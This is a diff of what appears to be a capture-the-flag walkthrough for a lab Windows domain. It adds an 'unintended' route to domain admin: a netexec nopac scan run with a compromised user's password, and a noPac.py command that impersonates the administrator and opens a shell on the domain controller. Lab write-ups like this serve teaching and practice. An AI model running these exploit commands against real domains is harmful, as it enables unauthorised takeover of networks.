@@ -177,9 +177,18 @@ SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson
 ```
 This user is compromised
 
-# Domain admin
-```pythoi
+# Domain admin (Unintended)
+```python
+nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' -M nopac               
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+NOPAC       10.129.18.9     445    CASC-DC1         TGT with PAC size 1487
+NOPAC       10.129.18.9     445    CASC-DC1         TGT without PAC size 722
+NOPAC       10.129.18.9     445    CASC-DC1         
+NOPAC       10.129.18.9     445    CASC-DC1         VULNERABLE
+NOPAC       10.129.18.9     445    CASC-DC1         Next step: https://github.com/Ridter/noPac
 ```
+
 
 ```python
 python3 noPac.py cascade.local/r.thompson:'rY4n5eva' -dc-ip 10.129.18.9 -dc-host casc-dc1 -shell --impersonate administrator -use-ldap
